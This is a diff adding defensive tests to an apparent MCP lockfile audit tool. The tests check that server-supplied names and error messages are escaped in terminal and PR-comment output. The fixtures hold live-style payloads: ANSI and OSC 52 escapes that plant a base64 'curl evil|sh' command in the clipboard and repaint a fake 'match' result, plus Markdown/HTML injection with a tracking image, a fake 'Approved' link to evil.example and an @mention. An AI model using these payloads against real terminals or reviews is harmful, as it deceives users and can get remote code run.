@@ -311,3 +311,42 @@ describe("capability policy decides the verdict", () => {
     expect(opted.runs[0].results.find((r: { ruleId: string }) => r.ruleId === "steering.passage.arrived").level).toBe("note");
   });
 });
+
+/*
+ * Text a server writes, rendered where a person reads it. Found in a security review: a version
+ * string could write to the clipboard (OSC 52) and repaint the terminal to read "match", and a
+ * tool name rendered as a tracking image, a fake "Approved" link and a mention in the PR comment.
+ */
+describe("server text in human and Markdown output", () => {
+  const hostileName = "evil\u001b[2K\u001b[1A";
+  const injected = "![x](https://evil.example/b.png) [Approved](https://evil.example/) @octocat <img src=x> `code`";
+  const hostile: AuditReport = {
+    changes: [
+      ...diffLockfiles(lockOfTools([makeTool({ name: hostileName, description: "a" })]), lockOfTools([makeTool({ name: hostileName, description: "b" })])),
+      ...diffLockfiles(lockOfTools([makeTool({ name: injected, description: "a" })]), lockOfTools([makeTool({ name: injected, description: "b" })])),
+    ],
+    unreachable: [{ server: "payments", reason: "boom\u001b]52;c;Y3VybCBldmlsfHNo\u0007\u001b[2J\u001b[H✓ 1 server(s) match", kind: "unreachable" }],
+    serversChecked: 2,
+    lockPath: "mcp.lock",
+  };
+
+  it("shows terminal escape sequences instead of letting the terminal run them", () => {
+    const text = renderHumanReport(hostile);
+    expect(text).not.toContain("\u001b");
+    expect(text).not.toContain("\u0007");
+    expect(text).toContain("\\u001b");
+  });
+
+  it("renders no image, link, mention or HTML from a server in the PR comment", () => {
+    const comment = renderMarkdownReport({ ...hostile, unreachable: [{ server: "payments", reason: injected, kind: "unreachable" }] }) ?? "";
+    // In a code span (the tool's name): fenced longer than any backtick it holds, so it stays code.
+    expect(comment).toContain("`` example/![x](https://evil.example/b.png)");
+    expect(comment).toContain("`code` ``");
+    // In plain text (the reason): every Markdown and HTML character escaped, the mention and the
+    // link broken, so none of it renders.
+    expect(comment).toContain("\\!\\[x\\]\\(https&#58;//evil.example/b.png\\)");
+    expect(comment).toContain("&#64;octocat");
+    expect(comment).toContain("&lt;img src=x&gt;");
+    expect(comment).not.toContain("\u001b");
+  });
+});
